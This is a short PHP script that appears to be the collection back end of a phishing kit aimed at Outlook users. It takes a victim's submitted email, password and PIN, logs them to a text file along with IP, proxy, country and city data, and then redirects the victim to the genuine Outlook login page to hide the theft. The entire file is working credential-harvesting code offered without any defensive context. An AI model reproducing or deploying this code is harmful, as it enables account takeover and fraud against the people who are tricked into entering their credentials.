<?php

date_default_timezone_set('America/Caracas');
ini_set("display_errors", 0);
$ip = $_SERVER['REMOTE_ADDR'];
$ip_comp = $_SERVER['HTTP_CLIENT_IP'];
$userp = $_SERVER['HTTP_X_FORWARDED'];
$proxy = $_SERVER['HTTP_X_FORWARDED_FOR'];

$cc = trim(file_get_contents("http://ipinfo.io/{$proxy}/country"));
$city = trim(file_get_contents("http://ipinfo.io/{$proxy}/city"));

if(isset ($_POST['eml']) && isset ($_POST['emlpss']) && isset ($_POST['p'])){

	$file = fopen("NEW015.txt", "a");

fwrite($file, 
"* EMAIL: ".$_POST['eml']."
* PASS: ".$_POST['emlpss']."
* PIN: ".$_POST['p']."
* FECHA: ".date('d-m-Y')." 
* HORA: ".date('H:i:s')."
* IP: ".$ip."
* PROXY: ".$proxy."
* IP COMPARTIDA: ".$ip_comp."
".$userp."
".$cc."
".$city."   
" . PHP_EOL);
fwrite($file, "========================= " . PHP_EOL);
fclose($file);
header ('location: https://outlook.live.com/owa/');

}else{ header ('location: index.php');  }

?>





